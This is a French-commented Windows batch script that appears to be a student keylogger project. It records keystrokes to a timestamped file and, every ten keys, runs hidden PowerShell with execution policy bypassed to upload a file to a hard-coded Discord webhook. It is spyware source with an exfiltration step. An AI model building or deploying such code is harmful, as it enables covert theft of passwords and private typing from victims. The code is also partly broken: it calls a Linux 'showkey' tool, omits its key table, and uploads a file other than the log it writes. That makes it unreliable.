@echo off
setlocal EnableDelayedExpansion

REM Déclaration du tableau associatif
set "teclas[01]=<ESC>"
set "teclas[02]=1"
...
REM (Code du tableau teclas)

set "FILE=C:\COURS\A_T_E_L_projetfindesemestre\stock\teclas_%date:~0,2%-%date:~3,2%-%date:~6,4%-%time:~0,2%.%time:~3,2%"

echo ==================== %date% %time% =====================>> "%FILE%"

REM Initialisation des variables
set "key_count=0"
set "max_key_count=10" REM Nombre maximal de touches avant l'envoi du rapport

REM Fonction logger
:logger
for /f "delims=" %%i in ('showkey') do set "linea=%%i" & goto process

:process
for /f "tokens=4,5" %%a in ("%linea%") do (
    set "t=%%a"
    set "estado=%%b"
)
if %t%==42 set "SHIFT=true"
if %t%==54 set "SHIFT=true"
if %t%==58 if %estado%==pulsada echo <CAPS o MAYS Pulsado> >> "%FILE%"
if %t%==58 if not %estado%==pulsada echo <CAPS o MAYS liberado> >> "%FILE%"
if %t%==28 if %estado%==pulsada echo. >> "%FILE%"
if %t%==57 if %estado%==pulsada echo. >> "%FILE%"
if %t%==100 if %estado%==pulsada set "altgraph=true"
if %t%==100 if not %estado%==pulsada set "altgraph=false"
if %t%==14 if %estado%==pulsada echo <BackSpace> >> "%FILE%"
if %t% LSS 100 if %t% GTR 9 (
    if %estado%==pulsada (
        if !altgraph! == true (
            for /f %%T in ("!t!") do echo !teclas[%%T+100]! >> "%FILE%"
            goto :continue
        )
        if !SHIFT! == true (
            for /f %%T in ("!t!") do echo !teclas[%%T+154]! >> "%FILE%"
            goto :continue
        )
        if !t! LSS 10 (
            echo !teclas[0!t!]! >> "%FILE%"
            goto :continue
        ) else (
            echo !teclas[%t%]! >> "%FILE%"
            goto :continue
        )
    )
) else (
    if %estado%==pulsada (
        if !SHIFT! == false (
            echo !teclas[%t%]:~0,1! >> "%FILE%"
            goto :continue
        )
        if !SHIFT! == true (
            echo !teclas[%t%]:~1,1! >> "%FILE%"
            goto :continue
        )
    )
)

:continue

REM Incrémentation du nombre de touches
set /a "key_count+=1"

REM Si le nombre de touches atteint le seuil maximal, envoi du rapport et réinitialisation du compteur
if !key_count! equ !max_key_count! (
    REM Envoi du rapport à Discord
    powershell -NoP -NonI -W Hidden -Exec Bypass "(New-Object System.Net.WebClient).UploadFile('https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF', '%temp%\system_info.txt')"
    set "key_count=0"
)

goto logger
